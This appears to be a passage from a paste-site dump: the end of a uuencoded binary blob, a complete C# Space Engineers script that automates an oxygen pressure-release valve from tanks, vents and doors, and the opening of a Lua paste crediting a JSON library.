M:8\@/SSGV-S]QJ`Q-T#H.WCL4/R!N#97*!!'&+G,K,J]'`.TYCXI1Z@$_3_O
MH+E5P]'""_T,-F$[\OW0Z;293</Z7T5W_<W<N[IV)T<?(21L$3P9]'9DLYE%'
M[C!6YVB4?""O6C)-5B#AB%.3:6^CI[?""-?YJ?HJ[3I^(*ZK__Z,_5P-%<_W73
M3)M$_Y.)).H""DOY?LJO_=^/JN/^G/-OOY(QJX2!?+]8*@*(#J>IGRAU(><F=
M-TT`:RX<UYY$WQ`2*YYL""Q-!$+@T?8QT,]FK@X>VLN>L^W>D-.X]P]W'<1JX
M(CYC,6<X1N/N!/0*[LR7A9""=E0;R_N96\<PX[DD%CHQK%>,;/`JOV0%T@:#?
MSD)\V^T:JB)_`P`$.J7#''&U""H.N<L""O+\X7CRC`CW$:""NS>[6A>,A]-`Q69
M`!8=-BOW,)WO?I@%\8:)'WY>FCK.""GH0HIT&?$T#K!'=JHK\%0<..*/N8.1@
MU>)]VY""9D""C@.QI@P.L]CS4995A95*]Z=`>B`_""""(<!'8:!N#<G4$GN'$<&A
M)+""TG!0""#2C!>5M2$A)4'(J1I0=D=GD:)@B4.%8K$%D('QCR3R9#6``B""MY\
M/3""A>\QQYX0$XNF;/*A`#""G`""@WVQ,7!!%Y/4@8MG-LI']<IQ$R/N^V'2^-!
M%E_,],H'P=8K1[_:&`58A8#HM@8TVAK`:L-Z=,.F6X9--PF:%J*?.PM^)M.'
M!:Z4>""H9FP=R,T""S;D/J%2=!PMM(^`Y-X$>QV8^`3,:2F4_!CZ%3G1U%6G<>
M:,VC)ARRU85G9;""V8^$46$4BLCV)59A+SUZ5BL4X\I&/N,Q2*DL7$L7M;A6)
M@]71;5FC:.=1WSQJA)""-PRY](5@LWHIQ+!`G'AHFWGZ4>-B(K""C""7U5;,&_-
M/S.O""/BT^U1Y`KHGR#KD;+N(&B4Q;-MG>&?4AK?E0A1F>&?NT/""N,**]<\.K
M#L=LSVW[5,2]WTE(>[-X><^V!J+2N0+(TR\L1%V8??GI1JJ3""NPH5ET4'9Q""
M)8(\E%SH\7021BY$9[;;M?R8H\O;5KT64>=M%T<""YO.@V@6ROC#MNL1+]&:T
M5Q*;WE;A6\>K;PV4:I;.0+7/%6AGW-)#\E@)PH`)UQ1(U&D[0=I6>'P0L<_X
M=E9G,TWKK'FT_,IK2Q%!WUG4O!CN[E-]*=K=WP#!""W43I`I_G^XX_%W$AA.&
MJ5O[8?%^D""B3FGY?M+SG=_&P^,?0.^(JMAD<KH@<#@N>X6-+)`R:V;N0@0(^
M(N?%IK`<F]G@[>8XBWSDSN<G8<[UDW0%YW\8&[<XY:FIDZLQ`]1J_M?4-![_
ME\;S/\E$-_[OKES^.1`]=2B^+;I^8$P;F\MGT'_\-\`J""H^=X<UFYY#+`3.\
MY#FXE@-C<X7""V)S+4WMY8&]9V).6)6=Y8)$+GU:!Y1E;HWQ.A2R4$>9B>.O/
MZ$5J_-/FW\_ZU43_9U=I^]=6^[\:J62""[O^:3.MI'>(_T@FSJ_]WXY(4T#!T
M60=3>DI60SA=!""FO-']*+,=<,CDVE[&0)4#?21/]SJ-O9VQ.RV"";,J?!;XU_
M;'2?T5BZ`6));`K#)GEMLS5<PX-+8`1A=P*7PLB0^P3`M@F>E-V,?A$'@=$N
M_5I.!9?`Z)Q^`E=#%CF?)C#$,B3==LO`\`RTK%N""B^-A]Y!'Q^T)A5'H%+>(
ME\*0<,MU9*167\9$')D\YP<I&WK65*Y7QE,_3C\^+>F7]97+.Y=33Q:;\F_U
MRZ*;'T]9FO+/#""LCA[%R&1'T5L29Z(2O!(:,,Z.3]Y!?%V`E0==2A""93)]Y8
M/L]Y*J8U+8(/GJ51GH1%Y#>?).\+&LD/GU1�-PL?)!V9,&H@M]6P[/""Y\,
MHL=.4!B(;M,)PDH#+VW`U0P/A^'A*JAP-<-#;:%)^&BG@VGP<[,9SPB,-,J;
M=VB=TSHV4)H""\$(+YR<I#]<7D7=0=[[R6(06L5P9E,=!.--4QD!W()^O/@0>
M)7-^F%`.)T-XKM%Z`7FQ$8UNGM@5+*NZ7U:A/#GTKH#H<`5X2586E]CV9OK""
M9->2VM`D;:.8_#)]T*&]I>TBE$4'_KI^_@`_TC;<#WB]$/A`W>)WFK_\\L=%
M,'(6LWE<UC,%4J\92H.9(#R`9[9-ZUBP+TF=T.A2??'12>L/9`1^@XP`/&@C
M@497\]NCC$YES""&XTI26!/J=2/%\CNG/ETIQ>72H?.!G)JE?H(G=%U@=`RS$
M*UM7P:+Z`O#DO.@[G2!^B^^Y0%\.>&/Z[3JD@W+A,NM""6JDLK!QN@M.1IGH&
M]0ZVU#0%OR-)\$,Y,&PJ=[@.!1B@LT1>^$>CM@#2X_<9Z;V'0_`='$(#V&\/
MIRG@I'06\A0^U5,F'VFPT4Y01G""YJ(XRWJ1D^:!ER2C*DJ&V'.I&?,[TR.,K
M\\?HLS2S&RDBQ^!#J628V2""0)XWJ7`;L;2Y8?U#/P'MHF^!>16]2Y[J/\2;#
M\9K4OC*^Z""[#*>AMGMA=%5_@>4IZ#K8/[*E-;1#FMUS_FO_#Y!W*5Z!M%J:)
MVM.,E`?+@4'+@K[U!/D-LA;$1>4#RFP1FYDP2!LBMTE@KU,Z+;,CEHW;0L!C
M4AG'[2RC/<=AXN=,-@PBWZ9%>6IP?ML9>L]H,&GZ!+?%*9_<$1BX3JD>L;QY
M*U@>:#]!EW""[ER'US71.9_82?7(2'4Q^=9O0E`^A`^""F/9O""RXKS,WY(MH#7
M#^<I+G>2UJ/EAP/M`:95)[:1U;F!;9\@8Y(<PON$PIZ9U`?`98>V(.5OYU@=
MJV6)R27M=WD\X_YI1I'/XZ>@QP:SNR`;:;`G?IW#-L5N8D\,E;WC/AVW*=2>
MI!1U3/UEGSW)!/D!;;&'-\S.^NP)KQ<]Y\?+[(-/YZG_`CJ:<`DM%I53N>WP
MZ;Q/OU2VAON6>#P@&=014=Y`_PT*US28C:/MOL+^%42=S0@T2&T%\Y.U@F0K
MA/;:83(NV(*TH!.F07G*Y#^CD&^;RS?8ZWR>U[.+^T*\S99I#)-=#`_*8##[
M2?M1*E_?$G!1WRZCE&$""`^0);`NTZ0%YR@1E.%,0><1YRLIO)0@N*$-""#\H[
M\S^3U/\UA+&+@`^L*>0NT%X#750^\O[Z8_X!^V;ZPV2M7;V%?#)<M>\L^&,2
M[:#?N.^25^&F>+&_2?LO@B]M2GT79I.Q#61M95+TC[C]P/T/BMMTPW&;@E])
M\-(V*H2GK#^3H>T^R#O0S/HZ:6',@.%W<R%RIN!YP95DC.)4^3(&]2V9C&<""
M_*=TZ)P6L(FA]2#2`G;!\=.A:>I^O=C&L+ZK7Q:$>J%T.(5PGJCZ^Z)=STOC
MJQY_)+MB!/@FT""&T/7*_SPFS""S:7#Y%/5B9(3YKV&WS\4-&1#JL[3@_`#](C
MC,/0]@!P@GT/R""JUZ5;`]OK'8.5V'OJGK>26C5TD76[G<EI0-L-L`\'%^\@M
M\4'?.2'46X;9`MZ_%>TLMO$Y!<R,6`;$0T'&9)O.9#;EM`.+V@]7:A]R!);O
M64:""7V#P_3Y_D.?H/DW:6'EL!X_[&.#K$!A.7K""3<G^-UC/X#P5+4:X$;_=5
M]:<Q6@K-ZIBWM[E4""/\28\HV$LH6X`>5*S:&E91L(K0SZO&KX+@V&\-*4-\P
M,/ZJT?$XG8S!B?U*H,%V_;SPC0>GN6_E3^>WIV):L,NV4!8[1V0KD([JBYA6
M'NOWTB;\Z7)LCD><6V-I-7]:+*\""3-FO$'5.$^H-QOI\]0Q^7""HHRX74F&_<
MP57X&ZS-24OS7%Z?`'B;\_<;FK6OMN3KLK:C8`=YRL9^,]1W=S3_.X^&G%I.
MP5?F\/VP91_$]OKF!`;8:I%.ALO5_;J:%V2+?<3^G#?F""F.CDKW`]M&4=)_Z
MH""Z5#SML[%/B:]I4U1W7?;!#!4%7Q3$W]MM.$EYH0EWG:;_!L<9\/K4%-*<)
M[4""SE23UHZ+7LV,.28?+KOG+;%%_5LS/?!U#Y8\YP?3,)[7H.+#OG<';N82N
MYKECA]""O&J=SJ1[+LJR@BXTCVI[-XG+*YI=8WYC9^H#=,LG8-<@;24/K1;:#
M!9HN*=D+@_-&10?K6^)Q%E8?2AX2^>/\X^-!838&VJA4FM:G+?',X3KG2F46
M==S)2?(;J!ONP^!VC.E]1F%3V+N`O17&<A2VVY?75KP3RA)FKSP9D7G+YCS`
M/[34]E07?1#J]^#WBG;.9?.5*2&-)""N,M]B&J7B;X/Q0ZC>U&Y;1S(90G\Y:
MH0W!_@:?:\3C^<SN.62L7+2])AUKE'79&X<QN,X%]8'K$/81#:[CN(T6Y@ID
M'==T7@Z_KHOE@#+0?C:S.5)Y07<=G;07K.X\&)YM""[8-WAREX:]+5?ODZ[\D
M_'H*.+W^A^:'Q>8VF>^7RRCH`#_;HGY@1NT+YGWQ'5Q?L-PF:3G@7H!KN+S-
MQ&6TQ'=4]Q'=*8O,9<$8'HP+0#[0E13UC0'?QQ/K&![_MUK1?Y&(;L#.3N'Q
MOW##XG_UA`8;0B731B1NK'XH8O#Z.8__""];_+-[P>C49WB+^6T]J21K_F4@@
M68'X3UWOQG_>E6MU]W]M?S-7<FP@VWG5OU+$A/7C;>ZY2J25[[8Z6;3C!Q'P
M0^$;3&#(VQ`:""EF]R^F!89Q=WJI$L5>)<I\<O@8J)^SJNDFY^DFU_$D)E&]W
M@DKH+=6#_;/%S4[(O0]PDTU]V""H?;[TV;-O]0-Q()LEB:F_!#$Y.]O1&19I@
MN]!N\F_XHN#A2O:)[81]':QS[(!W+5?9?3I6$@7M_W!V^V.[LZN)HX7]-S3=
M(/8_F4IHNH:WA.ON_WAWKD#]#Y:.G(IOB8],3,Y.%.,[W1G82^TK-OZ>>;14
M/)X[-6@_51YTG?)@KHQ,_CY8=$[7G>.-#(Z?Q.<>%LO3-FPQ@5_LW[/K"";P&
M<VC[\/:17?NR(_'M>QZ+C^X:WC\2/YY#RA8],3Z!#/G,>+$\Z<""Y&WCW`62=
MBM/DH)6IXQ.3`!@O\,?`!^/Q?1AI""4Y_(;NE.$47'^L6)1GPZ2]%NKC0=<C2
MPD)Q>@KEW2V?&C/EEL:+S@S>/<[;GJ$\@Y!&R?X!?/<K1%CQR'1N""KYG)QR4
M;@ME`*8%EX@Q!6]6-U&:F&5T1Q&N\>()*)93Q(OV!Z/1G8_O'MKUC>W[=CV^
M!_&4%=@5BOM(-/H@/JPM-SGY($XS[4X59UV>=&**;(XQ`V0Y9=N%Y<2PX8QK
ME^E^$F[)'F1P[$DW=PQ!&MZ_9\^N/5^+[_MZ-@[GV0UOWST2C4XB@LF1+EOR
M[I83N6F\&QWB#@+N4I2.M^T27;>.TR/>#F'\M+JBN/A>%5'6SO!C>TKN]""S=
M$F=+'%EQNG87\=!C3#:^;]?N+.RTE=T)/(H_SF4IOO/QQ[*8(7!FWTG$+#@Q
MG:^8MXN.""Q9_ZOCD2<8SS-:34_GB9!S.1!)W"",P=<Z+3+GXZ@<_4\2`""(%2X
M;\*]#SHY+(;N.$@8D9N>P!R/>@G)[AT'H16C""V[PD9*;Z/)4[XZMLP$?:A-""
M-^P6W&FJ2%$B68A1)V""W*K+;H5/<#!MKX57'.;YREBW@Q)LYY4CY77SJ:*%\
M#$M\;M*C;O!GN1'K7BN^@NV_2N_O#`<<4Z7)[3[?_U4WDB9;_Z>;.NS_G#)3
MB6[[?S>NIU&CW-/3X]VOB?1&X.[J;_7U)]#W7VPDSU%UH'</1>Z)]$6\U&?Z
M^N&S:WTD`I^U\`REA_=GT/>9W^WKAP]+OHZ^U]]Z""9+\_9DW]E=_,E([U/_2
M+^#;VJ';U1N'+K.'6Q0/:[LWO#2I2AQ5/(R]B%(_&?(B]N+^C2\=#D'Q@/IY
M#659#'^U5D78NO#TGPU_U1O^JD]Z=?8&\/3`Z(C>>!E^68<VSNY:O!""YV6B,
MP_UH;7__</WY1J.Q\-J&;?""D/,9>;!BN_Y'X8N?9*_!]]C(%=&*IEMVX:7F(
M@"".01E""&ZF64I?+6Z<^.$""#?0L^L:^4^_>*[:W'=+K[PWG\U&@>?/.P1^8<1
M3&3MT.>.1NJ__!&""43F-<EVI'&^0ZYT_0ZQZ-ON=HXG%[!M#J+![Z_6/@+:-
M""\N)6.4Z8LG9^3=`7F.5?T0WA5KVQX6%BQ\5%I9[8K_]*GGRK^BNMQ1%_]?%
M*M]'SQ;FK_?$*G^""?M6R;]?*&ZM]9NS%[/*KU]=6L^=J2T!""SY7JTASZ1L]O
M+_:=>?5Z;S5[IOI!S^61^E,?`@%]UK58Y=<!Q""*DKRZ6T/^C""&!]J%;>,%I_
M`).YH7(Q]LPCD&K^W`&2<N]H_7[RSEJ.5;X([RY@""!<FT7_]K2N5<?0-6E%8
MF%^.Q,X]BWY6_V?ATKT+2_A-:?W9'3>A+M[-U98@S\)7>\JC""Z=N1LI#M1VW
MK36QRNMK(I'>'>]5*PYZ?7\C%HG\%638]&KU=2M[;^S9[Z'WM?(7>B_`^VKY
M;92M=NHFE!DP]&;OK:('N^_MB2Y<BB]4`$=\)W#(NAQ[9A8P$DIBYPX#H$6X
M06RLS<>K&]+`@QN$!P,?>CQ(0<+Y,X@'<X0'7_K0X\'GUX#ZH]+>CI3VU,Y#
M`E1:*`IFQ8GH6B`>D?3NK]0,PJ;JS=X=RQ8N7CF&BHZJ\X=(Q'K+]U:-A4L/
M`;&WK<NG7Z[-WZ@N02I""I/6#Z?5$FJOS-Q:SSQ`R+WP`I/0#F<\B(""CO[P^-
M;P>""L]\9JF^Y#6)YO.$5Y3=0FJ/H;[2^X[;W<!0>$B%=@K0'Z@?)2RRG&?2V
MMOO<WMH%D)+1`_5?)2^M[+E8Y3X,KW;HW,+EQ$AM?L.!^G]^X,']""%5^#;-A
MT[6AVB*`WGN@_GD/<>5?4`*LN:@""1AGN?_N`ZV^L\M<8!G#ARQC2T`&L2#_R
ML%2>@Q3E,R@_,/\`Q5-_CJ2P;I9/`8%G>I\'("".8:;_&<I]^LI;]8R"".X!ZM
MS[,WY<=JN_OW8B9>>)^R^+2&V7N@/N4]^2)Z\@=#Z-]SZ''Q?0;VGI?!9KR[
M1G^+Z,=H??D65KP%C""AR.L9*^Z<X3Q]&U(-^5Z\MOO!$PV]I'M7!T@R-[!V^
M4KEVE>C7E<H/O5^W?]!H_%T__%I&O\!`7ZF\AWY]'S^[B7X-K2/57LOV#]4_
M!VC^%@C]W]@S_X$K</S;""-!H??!]K^Y>@UK'D(<6*Y$WT==H_6'(>(D\!=9>
MBE6>[X%\_XX*]TH#VY""CD7?^'#VK_^4MD+SK5[&]`X`S&%']K>5&`]FDQ;Z_
ML7X1:?8_(4G][O_=JIY_$Z?L6SP?N8XRGG_C*AC[.""@H_-Q;.P^@ANO;,=@?
M7V5T_DY_#TM377P=_=>1%5I8`M[T/OW*PA*P*_;T!437FMIY>+]P*5H]?Q'#
MVGC+X\/I(^,;$*#%RMM7<4G_>9DBF,_6,%.':H2/-<S8(8DSM46`N+?^-J[D
M+U0NEOH;N'[>7=?`-39:?V69U#,NZ&+?[RD94+VVTWHSMO@(:/L2%+*\1F\0
MNF,O[NCON4)*VG.+E!625R#?T__PSCJP$Y1)P\NT.A!""5+9UH_5'T1/]XN(+
MWT/OO_7-@T]@X5HJ(5>G\9/Z$++H@Y'Z,"")^<';""-!*P$_;J.&/=JWMUK^[5
MO;K7S\LU.'-RJI3+H^_2-/D>9[]@`]O((&PM&1G,S\RT#?*^""!F#@*XW--HP
M;O.C?OZ^CWY_B::#SC8>J]CHA\/2/8@^_6VD^PQ-PRY(MUFX[Q&^UPC/7T,9
M+U)Z[Z'P`,5Z""=ZY7R*TR/!4%Y0[@O.35&P<II=BYO>]OGR]7FG8_5KI?AV&
M^&T*_S.1_V[T""_@VHK<Q`3Z\OT^Z'Y#N(X==7-7D;+'(X<.HLMEO%U?_8??8
A'8Y!=J_NU;VZ5_?J7MVK>W6O[M6](I'_!U%M'88`\```
`
end"
S2GRFRTd,Twinkie's Pressure Valve,LtTwinkie,C#,Sunday 9th of July 2023 08:47:00 PM CDT,"/*
 * Twinkie Industries™ Automation Presents
 * Pressure Valve v1.0
 * 
 * This script will allow you to set up a number of oxygen tanks, vents, and doors so that they can be used together as a 
 * pressure release valve. The valve will try to lower pressure in the tanks from the maximum setting to the minimum.
 * 
 * You will need to set some Custom Data on the blocks that will be used.
 * 
 * On the oxygen tank(s), vent(s), and door(s)
 * [PressureValve]
 * Name=groupname
 */

// SETTINGS ---------------------------------------------------------------------------------------------------

// If you set a value for GRID_NAME, each block will require it in the name. This is used to prevent blocks from
// other grids being added.
public const string GRID_NAME = """";

// When the oxygen tanks reach this amount the valve will activate.
public const float MaximumPercent = 99f;

// When the oxygen tanks reach this amount the valve will de-activate.
public const float MinimumPercent = 96f;

// If you set custom data in any O2/H2 Generators, this setting determines if the valve controls the
// generator (true) or if the generator controls the valve (false).
public static bool ControlGenerators = true;

// END SETTINGS. DO NOT EDIT BELOW ----------------------------------------------------------------------------

private Dictionary<string, PressureValve> _valves = new Dictionary<string, PressureValve>();
private List<string> _invalidValves = new List<string>();

public Program()
{
    Refresh();
    Runtime.UpdateFrequency = UpdateFrequency.Update100;
}

public void Main(string argument, UpdateType updateSource)
{
    if (_invalidValves.Count != 0)
    {
        Echo(""Invalid pressure valves:"");
        foreach (string bay in _invalidValves)
        {
            Echo(bay);
        }
    }

    if (string.IsNullOrWhiteSpace(argument))
    {
        // Regular update loop
        foreach (PressureValve valve in _valves.Values)
        {
            valve.Update(Echo);
        }
    }
    else if (StringUtil.Equality(argument, ""refresh""))
    {
        // Refresh command
        Echo(""Refreshing"");
        Refresh();
    }
    else
    {
        Echo($""Unknown argument {argument}"");
    }
}

private void Refresh()
{
    _valves.Clear();

    var blocks = new List<IMyTerminalBlock>();
    GridTerminalSystem.GetBlocksOfType(blocks,
        block => StringUtil.Contains(block.CustomName, GRID_NAME) && CustomData.HasSection(block));

    foreach (var block in blocks)
    {
        CustomData data;
        if (!CustomData.TryGetData(block, Echo, out data))
            continue;

        string name = data.Name.ToLowerInvariant();

        PressureValve valve;
        if (!_valves.TryGetValue(name, out valve))
        {
            _valves[name] = valve = new PressureValve();
        }

        valve.Add(block, data);
    }

    foreach (KeyValuePair<string, PressureValve> valve in _valves)
    {
        if (!valve.Value.IsValid)
        {
            _invalidValves.Add(valve.Key);
            _valves.Remove(valve.Key);
        }
    }
}

public class CustomData
{
    private const string PRESSURE_VALVE = ""PressureValve"";
    private const string NAME = ""Name"";

    public MyIni Ini { get; } = new MyIni();

    public string Name => Get(NAME).ToString();

    public CustomData(IMyTerminalBlock block)
    {
        MyIniParseResult parseResult;
        if (!Ini.TryParse(block.CustomData, out parseResult))
        {
            throw new Exception($""Failed to parse ini {parseResult}"");
        }

        Check(NAME);
    }

    // TODO:CW base class the stuff below into a mixin

    public static bool TryGetData(IMyTerminalBlock block, Action<string> echo, out CustomData data)
    {
        try
        {
            data = new CustomData(block);
        }
        catch (Exception e)
        {
            echo?.Invoke(e.Message);
            data = null;
            return false;
        }

        return true;
    }

    public static bool HasSection(IMyTerminalBlock block)
    {
        return MyIni.HasSection(block.CustomData, PRESSURE_VALVE);
    }

    public MyIniValue Get(string key) => Ini.Get(PRESSURE_VALVE, key);

    private void Check(string entry)
    {
        var nameResult = Get(entry);
        if (nameResult.IsEmpty)
        {
            string message = $""Can't find {entry} in CustomData"";
            throw new Exception(message);
        }
    }
}

public class Door
{
    public const int DELAY_STANDARD_MILLIS = 1000;
    public const int DELAY_HANGAR_MILLIS = 10000;
    private int _customDelay;

    private bool _isHangar;

    public IMyDoor Block { get; }

    public bool Enabled { get { return Block.Enabled; } set { Block.Enabled = value; } }
    public DoorStatus Status => Block.Status;
    public float OpenRatio => Block.OpenRatio;

    public Door(IMyDoor block, int customDelay = 0)
    {
        Block = block;
        _customDelay = customDelay;
        _isHangar = block is IMyAirtightHangarDoor;
    }

    public static void SetEnabled(List<Door> doors, bool value)
    {
        foreach (Door door in doors)
        {
            door.Enabled = value;
        }
    }

    public static bool AnyOpened(List<Door> doors)
    {
        foreach (var door in doors)
        {
            if (door.Status == DoorStatus.Open)
                return true;
        }
        return false;
    }

    public static bool AnyClosed(List<Door> doors)
    {
        foreach (var door in doors)
        {
            if (door.Status == DoorStatus.Closed)
                return true;
        }
        return false;
    }

    public static DateTime OpenDoors(List<Door> doors)
    {
        DateTime maxDelay = DateTime.MinValue;
        foreach (Door door in doors)
        {
            DateTime delay = door.OpenDoor();

            if (delay > maxDelay)
                maxDelay = delay;
        }

        return maxDelay;
    }

    public static DateTime CloseDoors(List<Door> doors)
    {
        DateTime maxDelay = DateTime.MinValue;
        foreach (Door door in doors)
        {
            DateTime delay = door.CloseDoor();

            if (delay > maxDelay)
                maxDelay = delay;
        }

        return maxDelay;
    }

    public DateTime OpenDoor()
    {
        if (Block.Status != DoorStatus.Open)
        {
            Block.Enabled = true;
            Block.OpenDoor();
            return Delay();
        }

        return DateTime.MinValue;
    }

    public DateTime CloseDoor()
    {
        if (Block.Status != DoorStatus.Closed)
        {
            Block.Enabled = true;
            Block.CloseDoor();
            return Delay();
        }

        return DateTime.MinValue;
    }

    public DateTime ToggleDoor()
    {
        if (Block.Status == DoorStatus.Closed ||
            Block.Status == DoorStatus.Closing)
        {
            return OpenDoor();
        }

        return CloseDoor();
    }

    private DateTime Delay()
    {
        int standardDelay = _isHangar ? DELAY_HANGAR_MILLIS : DELAY_STANDARD_MILLIS;
        int delay = _customDelay != 0 ? _customDelay : standardDelay;
        return DateTime.UtcNow + TimeSpan.FromMilliseconds(delay);
    }
}

public class GasGenerator
{
    public IMyGasGenerator Block { get; }

    public bool Enabled { get { return Block.Enabled; } set { Block.Enabled = value; } }
    public bool AutoRefill { get { return Block.AutoRefill; } set { Block.AutoRefill = value; } }
    public bool UseConveyorSystem { get { return Block.UseConveyorSystem; } set { Block.UseConveyorSystem = value; } }

    public GasGenerator(IMyGasGenerator block)
    {
        Block = block;
    }

    public static void SetEnabled(List<GasGenerator> generators, bool value)
    {
        foreach (GasGenerator generator in generators)
        {
            generator.Enabled = value;
        }
    }

    public static bool IsAnyEnabled(List<GasGenerator> generators)
    {
        foreach (GasGenerator generator in generators)
        {
            if (generator.Enabled)
                return true;
        }
        return false;
    }

    public static void SetAutoRefill(List<GasGenerator> generators, bool value)
    {
        foreach (GasGenerator generator in generators)
        {
            generator.AutoRefill = value;
        }
    }

    public static void SetUseConveyorSystem(List<GasGenerator> generators, bool value)
    {
        foreach (GasGenerator generator in generators)
        {
            generator.UseConveyorSystem = value;
        }
    }
}

public class GasTank
{
    public IMyGasTank Block { get; private set; }

    public bool Enabled { get { return Block.Enabled; } set { Block.Enabled = value; } }
    public bool Stockpile { get { return Block.Stockpile; } set { Block.Stockpile = value; } }

    public bool AutoRefillBottles { get { return Block.AutoRefillBottles; } set { Block.AutoRefillBottles = value; } }

    public float Capacity => Block.Capacity;

    public double FilledRatio => Block.FilledRatio;

    public GasTank(IMyGasTank block)
    {
        Block = block;
    }

    public static void SetEnabled(List<Door> doors, bool value)
    {
        foreach (Door door in doors)
        {
            door.Enabled = value;
        }
    }

    public static bool AnyStockpiling(List<GasTank> tanks)
    {
        foreach (var tank in tanks)
        {
            if (tank.Stockpile)
                return true;
        }
        return false;
    }

    public static void SetStockpile(List<GasTank> tanks, bool value)
    {
        foreach (var tank in tanks)
            tank.Stockpile = value;
    }

    public static void SetAutoRefill(List<GasTank> tanks, bool value)
    {
        foreach (var tank in tanks)
            tank.AutoRefillBottles = value;
    }

    public static double GetFilledRatio(List<GasTank> tanks)
    {
        double totalFill = 0d;
        foreach (GasTank tank in tanks)
            totalFill += tank.FilledRatio;

        return totalFill / (double) tanks.Count;
    }
}

public static class MathUtil
{
    public static T Clamp<T>(T value, T min, T max) where T : IComparable<T>
    {
        if (value.CompareTo(max) == 1)
            return max;

        if (value.CompareTo(min) == -1)
            return min;

        return value;
    }

    public static float Clamp01(float value)
    {
        if (value > 1f) return 1f;
        if (value < 0f) return 0f;
        return value;
    }
}

public class PressureValve
{
    private const int TIMEOUT_MINUTES = 1;

    private PressureState _state;
    private bool _valveOperating;
    private bool _open;
    private DateTime _lastValveChange;

    private List<Door> _doors = new List<Door>();
    private List<Vent> _vents = new List<Vent>();
    private List<GasTank> _tanks = new List<GasTank>();
    private List<GasGenerator> _generators = new List<GasGenerator>();

    public bool IsValid => _doors.Count != 0 && _vents.Count != 0 && _tanks.Count != 0;

    private float Max => MathUtil.Clamp01(MaximumPercent / 100f);
    private float Min => MathUtil.Clamp01(MinimumPercent / 100f);

    private enum PressureState
    {
        OK,
        UNDER,
        OVER
    }

    public void Update(Action<string> echo)
    {
        RefreshState(echo);

        if (ControlGenerators)
            OperateGenerators();

        OperateValve(echo);
    }

    private void RefreshState(Action<string> echo)
    {
        double ratio = GasTank.GetFilledRatio(_tanks);
        if (ratio > Max)
            _state = PressureState.OVER;
        else if (ratio < Min)
            _state = PressureState.UNDER;
        else
            _state = PressureState.OK;

        echo.Invoke($""State: {_state}"");
    }

    private void OperateGenerators()
    {
        switch (_state)
        {
            case PressureState.UNDER: GasGenerator.SetEnabled(_generators, true); break;
            case PressureState.OVER: GasGenerator.SetEnabled(_generators, false); break;
        }
    }

    private void OperateValve(Action<string> echo)
    {
        if (GasGenerator.IsAnyEnabled(_generators))
        {
            // Disabled while generators are running
            _valveOperating = false;

            if (Door.AnyOpened(_doors))
                Door.CloseDoors(_doors);
        }
        else
        {
            _valveOperating = _state == PressureState.OVER;
        }

        if (!_valveOperating)
            return;

        if (Vent.AnyDepressurizing(_vents))
            Vent.SetDepressurize(_vents, false);

        if (GasTank.AnyStockpiling(_tanks))
            GasTank.SetStockpile(_tanks, false);

        // Open and close based on vent pressure
        float averagePressure = Vent.OxygenLevelAve(_vents);
        if (!_open && averagePressure > 0.99f)
        {
            // Full
            _open = true;
            _lastValveChange = DateTime.UtcNow;
        }
        else if (_open && averagePressure < 0.01f)
        {
            // Empty
            _open = false;
            _lastValveChange = DateTime.UtcNow;
        }

        // Check timeout
        if (_lastValveChange < DateTime.UtcNow - TimeSpan.FromMinutes(TIMEOUT_MINUTES))
        {
            echo.Invoke($""Valve has timed out. Last change: {_lastValveChange}"");
        }

        // Ensure door state
        bool isOpen = Door.AnyOpened(_doors);
        if (!_open && isOpen)
        {
            Door.CloseDoors(_doors);
        }
        else if (_open && !isOpen)
        {
            Door.OpenDoors(_doors);
        }
    }

    public void Add(IMyTerminalBlock block, CustomData data)
    {
        if (block is IMyDoor)
        {
            _doors.Add(new Door(block as IMyDoor));
        }
        else if (block is IMyAirVent)
        {
            _vents.Add(new Vent(block as IMyAirVent));
        }
        else if (block is IMyGasTank)
        {
            _tanks.Add(new GasTank(block as IMyGasTank));
        }
        else if (block is IMyGasGenerator)
        {
            _generators.Add(new GasGenerator(block as IMyGasGenerator));
        }
        else
        {
            throw new Exception($""Unknown block type {block.GetType()}"");
        }
    }
}

public static class StringUtil
{
    public static bool Contains(string text, string testSequence, bool useInvariant = true)
    {
        return useInvariant
            ? text.ToLowerInvariant().Contains(testSequence.ToLowerInvariant())
            : text.ToLower().Contains(testSequence.ToLower());
    }

    public static bool Equality(string a, string b, bool useInvariant = true)
    {
        return useInvariant
            ? a.ToLowerInvariant() == b.ToLowerInvariant()
            : a.ToLower() == b.ToLower();
    }
}

public class Vent
{
    private const int DELAY_MILLIS = 2000;

    private int _customDelay;

    public IMyAirVent Block { get; }

    public bool Enabled { get { return Block.Enabled; } set { Block.Enabled = value; } }
    public bool CanPressurize => Block.CanPressurize;
    public float OxygenLevel => Block.GetOxygenLevel();
    public VentStatus Status => Block.Status;
    public bool PressurizationEnabled => Block.PressurizationEnabled;

    public bool Depressurize => Block.Depressurize;

    public Vent(IMyAirVent block, int customDelay = 0)
    {
        Block = block;
        _customDelay = customDelay;
    }

    public static void SetEnabled(List<Door> doors, bool value)
    {
        foreach (Door door in doors)
        {
            door.Enabled = value;
        }
    }

    public static float OxygenLevelMin(List<Vent> vents)
    {
        float level = float.MaxValue;
        foreach (var vent in vents)
        {
            if (vent.OxygenLevel < level)
                level = vent.OxygenLevel;
        }
        return level;
    }

    public static float OxygenLevelMax(List<Vent> vents)
    {
        float level = float.MinValue;
        foreach (var vent in vents)
        {
            if (vent.OxygenLevel > level)
                level = vent.OxygenLevel;
        }
        return level;
    }

    public static float OxygenLevelAve(List<Vent> vents)
    {
        float level = 0;
        foreach (var vent in vents)
        {
            level += vent.OxygenLevel;
        }
        return level / (float)vents.Count;
    }

    public static bool AnyDepressurizing(List<Vent> vents)
    {
        foreach (var vent in vents)
        {
            if (vent.Depressurize)
                return true;
        }
        return false;
    }

    public static DateTime SetDepressurize(List<Vent> vents, bool value)
    {
        DateTime maxDelay = DateTime.MinValue;
        for (int i = 0; i < vents.Count; i++)
        {
            if (vents[i]?.Block == null)
                continue;

            DateTime delay = vents[i].SetDepressurize(value);

            if (delay > maxDelay)
                maxDelay = delay;
        }

        return maxDelay;
    }

    public DateTime SetDepressurize(bool value)
    {
        if (Block.Depressurize != value)
        {
            Block.Depressurize = value;
            return Delay();
        }

        return DateTime.MinValue;
    }

    private DateTime Delay()
    {
        int delay = _customDelay != 0 ? _customDelay : DELAY_MILLIS;
        return DateTime.UtcNow + TimeSpan.FromMilliseconds(delay);
    }
}"
wYy8nrfS,RanchHand,true_beef,Lua,Sunday 9th of July 2023 08:37:09 PM CDT,"-- Uses Lightweight Json Library by rxi. Thanks dude.
-- https://github.com/rxi/json.lua
-- json.encode({ 1, 2, 3, { x = 10 } }) -- Returns '[1,2,3,{""x"":10}]'
